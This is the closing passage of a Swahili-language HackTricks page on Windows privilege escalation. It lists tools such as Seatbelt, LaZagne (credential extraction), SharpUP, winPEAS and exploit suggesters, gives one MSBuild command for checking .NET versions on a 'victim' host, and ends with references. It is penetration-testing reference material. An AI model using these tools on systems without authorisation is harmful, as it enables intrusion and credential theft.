[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Huchunguza host ikitafuta misconfigurations (zaidi ni tool ya kukusanya info kuliko privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Hutoa credentials kutoka kwenye software nyingi (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port ya PowerUp kwenda C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Angalia misconfiguration (executable precompiled in github). Haipendekezwi. Haifanyi kazi vizuri katika Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Angalia misconfiguration zinazowezekana (exe kutoka python). Haipendekezwi. Haifanyi kazi vizuri katika Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool iliyoundwa kwa msingi wa post hii (haihitaji accesschk ili ifanye kazi vizuri lakini inaweza kuitumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Husoma output ya **systeminfo** na kupendekeza exploits zinazofanya kazi (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Husoma output ya **systeminfo** na kupendekeza exploits zinazofanya kazi (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Lazima ucompile project kwa kutumia version sahihi ya .NET ([tazama hii](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona version ya .NET iliyosakinishwa kwenye host ya victim unaweza kufanya:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Marejeo

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)

{{#include ../../banners/hacktricks-training.md}}
